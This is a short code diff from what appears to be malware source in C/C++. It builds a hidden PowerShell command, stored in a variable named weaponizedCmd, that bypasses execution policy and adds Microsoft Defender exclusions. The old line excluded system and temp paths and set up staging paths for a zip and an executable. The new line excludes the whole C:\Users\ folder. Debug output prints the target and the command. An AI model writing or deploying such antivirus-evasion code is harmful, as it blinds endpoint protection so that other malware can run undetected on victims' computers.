@@ -151,7 +151,7 @@ int main() {
 
     // 4. BUILD COMMAND
     swprintf_s(weaponizedCmd, 4086, 
-        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionProcess 'pdf.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\word.exe';Add-MpPreference -ExclusionPath 'C:\\Windows\\temp\\';Add-MpPreference -ExclusionPath 'C:\\Windows\\';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $wordPath='C:\\Windows\\Temp\\word.zip'; $extractPath='C:\\Windows\\Temp\\word'; $zipPath='C:\\Windows\\Temp\\pdf.exe';\"");
+        L"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath 'C:\\Users\\'\"");
 
     printf("[DEBUG] Target: %ws\n", targetPath);
     printf("[DEBUG] Full Cmd: %ws\n", weaponizedCmd);
